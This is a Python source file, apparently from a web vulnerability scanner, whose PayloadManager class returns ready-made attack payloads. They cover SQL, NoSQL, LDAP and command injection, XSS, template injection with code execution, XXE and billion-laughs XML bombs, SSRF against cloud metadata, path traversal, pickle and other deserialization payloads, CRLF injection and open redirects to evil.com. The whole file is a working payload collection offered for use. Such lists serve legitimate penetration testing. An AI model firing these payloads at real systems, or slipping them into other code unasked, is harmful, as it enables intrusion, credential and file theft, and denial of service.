"""
Advanced Payloads for OverApi Enterprise
"""

class PayloadManager:
    """Manages attack payloads for various vulnerability types."""

    @staticmethod
    def get_sqli_payloads():
        return [
            "' OR '1'='1",
            "' OR 1=1 --",
            "admin' --",
            "1' UNION SELECT null, null --",
            "1; DROP TABLE users",
            "' OR '1'='1' --",
            "') OR ('1'='1",
            "1 AND 1=1",
            "1 AND 1=2",
            "ORDER BY 100 --"
        ]

    @staticmethod
    def get_xss_payloads():
        return [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "{{7*7}}", # Angular/Vue
            "${7*7}"   # Template injection
        ]

    @staticmethod
    def get_cmd_injection_payloads():
        return [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "$(ls -la)",
            "`ls -la`",
            "|| ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd"
        ]

    @staticmethod
    def get_lfi_payloads():
        return [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "file:///etc/passwd",
            "C:\\Windows\\win.ini"
        ]

    @staticmethod
    def get_ssrf_payloads():
        return [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:25"
        ]

    @staticmethod
    def get_graphql_payloads():
        return [
            "{__schema{types{name,fields{name}}}}",
            "{__typename}",
            "query { users { id, password } }", # Generic guess
            "query { me { id, token } }"
        ]

    @staticmethod
    def get_xxe_payloads():
        return [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""
        ]

    @staticmethod
    def get_ssti_payloads():
        """Server-Side Template Injection payloads."""
        return [
            # Jinja2 (Python)
            "{{7*7}}",
            "{{config.items()}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{%for c in [1,2,3]%}{{c,c,c}}{% endfor %}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",

            # Twig (PHP)
            "{{7*'7'}}",
            "{{_self.env.display(\"block\")}}",
            "{{_self.env.getLoader()}}",

            # Freemarker (Java)
            "${7*7}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }",
            "${{7*7}}",

            # Velocity (Java)
            "#set($x=7*7)$x",
            "#foreach($i in [1..$out.available()])$i#end",

            # ERB (Ruby)
            "<%= 7*7 %>",
            "<%= system('id') %>",
            "<%= Dir.entries('/') %>",

            # Smarty (PHP)
            "{php}echo `id`;{/php}",
            "{$smarty.version}",

            # Mako (Python)
            "${7*7}",
            "<%import os;os.popen('id').read()%>",

            # Handlebars (JavaScript)
            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').exec('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
        ]

    @staticmethod
    def get_ldap_injection_payloads():
        """LDAP Injection payloads."""
        return [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin*",
            "admin*)((|userPassword=*)",
            "*)(objectClass=*",
            "*))(|(cn=*",
            "\\2a",
            "%2a",
            "*)(cn=admin",
            "*)(|(password=*",
            "*))(|(objectClass=*"
        ]

    @staticmethod
    def get_nosql_injection_payloads():
        """NoSQL Injection payloads (MongoDB, etc)."""
        return [
            # MongoDB
            "{'$gt': ''}",
            "{'$ne': null}",
            "{'$regex': '.*'}",
            "{'$where': 'this.password.length > 0'}",
            "{'$or': [{'a':1}, {'b':2}]}",
            "{'$gt': undefined}",
            "'; return true; var dummy='",
            "' || '1'=='1",
            "{$where: \"sleep(5000)\"}",

            # URL encoded
            "[$ne]=1",
            "[$regex]=.*",
            "[$gt]=",
            "username[$ne]=toto&password[$ne]=toto",

            # JSON
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
            '{"username": {"$regex": "admin"}, "password": {"$gt": ""}}'
        ]

    @staticmethod
    def get_xml_bomb_payloads():
        """XML Bomb (Billion Laughs) payloads."""
        return [
            # Billion Laughs Attack
            """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>""",

            # Quadratic Blowup Attack
            """<?xml version="1.0"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
]>
<bomb>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</bomb>"""
        ]

    @staticmethod
    def get_path_traversal_payloads():
        """Path Traversal payloads."""
        return [
            "../",
            "..\\",
            "..;/",
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....\\....\\....\\windows\\win.ini",
            "..%5c..%5c..%5cwindows%5cwin.ini"
        ]

    @staticmethod
    def get_deserialization_payloads():
        """Insecure Deserialization payloads."""
        return [
            # Java
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAADb2JqdAATamF2YS5sYW5nLlJ1bnRpbWV4",

            # Python Pickle
            "cos\nsystem\n(S'id'\ntR.",
            "c__builtin__\neval\n(S'__import__(\"os\").popen(\"id\").read()'\ntR.",

            # PHP
            'O:8:"stdClass":1:{s:4:"exec";s:2:"id";}',
            'a:1:{i:0;O:8:"stdClass":1:{s:4:"exec";s:2:"id";}}',

            # .NET
            "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0uV2ViLCBWZXJzaW9uPTIuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49YjAzZjVmN2YxMWQ1MGEzYQUBAAAAAlN5c3RlbS5XZWIuVUkuTG9zRm9ybWF0dGVyDQAAAANfaWQLbmFtZXNwYWNlATI=",
        ]

    @staticmethod
    def get_open_redirect_payloads():
        """Open Redirect payloads."""
        return [
            "//evil.com",
            "https://evil.com",
            "//evil.com/%2F..",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "//google.com",
            "///evil.com",
            "////evil.com",
            "https:evil.com",
            "/\\evil.com",
            "//evil%E3%80%82com"
        ]

    @staticmethod
    def get_hpp_payloads():
        """HTTP Parameter Pollution payloads."""
        return [
            "?id=1&id=2",
            "?name=value&name=value2",
            "?action=view&action=delete",
            "?amount=100&amount=9999"
        ]

    @staticmethod
    def get_crlf_injection_payloads():
        """CRLF Injection payloads."""
        return [
            "%0d%0aSet-Cookie:%20admin=true",
            "%0d%0aLocation:%20http://evil.com",
            "\r\nSet-Cookie: admin=true",
            "\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>",
            "%0aSet-Cookie:admin=true",
            "%0dSet-Cookie:admin=true"
        ]

    @staticmethod
    def get_unicode_payloads():
        """Unicode/Encoding Attack payloads."""
        return [
            # Unicode normalization
            "ᴬᴰᴹᴵᴺ",
            "𝓪𝓭𝓶𝓲𝓷",
            "ⓐⓓⓜⓘⓝ",

            # Double encoding
            "%252e%252e%252f",
            "%25%32%65",

            # UTF-8 overlong encoding
            "%c0%ae%c0%ae%c0%af",
            "%e0%80%ae%e0%80%ae%e0%80%af",

            # Mixed encoding
            "..%c0%af",
            "%2e%2e/",

            # Unicode bypass
            "＜script＞alert(1)＜/script＞",
            "＜img src=x onerror=alert(1)＞"
        ]

    @staticmethod
    def get_mass_assignment_payloads():
        """Mass Assignment payloads."""
        return [
            # JSON
            '{"isAdmin": true}',
            '{"role": "admin"}',
            '{"permissions": ["all"]}',
            '{"status": "approved"}',
            '{"balance": 9999999}',

            # URL encoded
            "isAdmin=true",
            "role=admin",
            "permissions[]=all",
            "status=approved"
        ]

    @staticmethod
    def get_polyglot_payloads():
        """Polyglot payloads (work in multiple contexts)."""
        return [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//><\\x3e",
            "'\"()&%<acx><ScRiPt >alert(1)</ScRiPt>",
            "<svg/onload=alert(1)>{{7*7}}${7*7}<? echo 7*7 ?>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
        ]
